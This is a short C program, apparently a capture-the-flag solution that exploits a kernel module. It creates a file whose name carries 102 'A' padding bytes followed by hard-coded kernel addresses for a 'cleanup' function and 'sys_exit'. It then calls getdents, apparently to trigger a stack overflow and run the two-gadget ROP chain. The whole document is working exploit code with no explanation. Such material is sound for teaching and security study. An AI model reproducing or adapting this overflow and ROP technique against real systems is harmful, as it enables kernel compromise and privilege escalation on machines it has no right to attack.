#include <sys/types.h>
#include <sys/stat.h>
#include <time.h>
#include <sys/syscall.h> 
#include <stdio.h>
#include <string.h>
#include <fcntl.h>
#include <stdlib.h>
#include <unistd.h>
#define _GNU_SOURCE           /* See feature_test_macros(7) */
#include <dirent.h>


#define OFFSET 102
#define cleanup 0xffffffffc01a036e
#define sys_exit 0xffffffffb943a390

int main(int argc, char **argv){
    char name[200];
    unsigned long *rop;
    
    memset(name, 0, 200);
    strcpy(name, "ecsc_flag_");
    memset(name+strlen(name), 'A',OFFSET );
    
    rop = (unsigned long *)(name+strlen(name));
    rop[0] = cleanup;
    rop[1] = sys_exit;

    int fd = open(name, O_RDWR | O_CREAT, 644);
    write(fd, name, 200);
    close(fd);

    fd = open(".", O_RDONLY | O_DIRECTORY);
    syscall(SYS_getdents, fd, name, 200);

}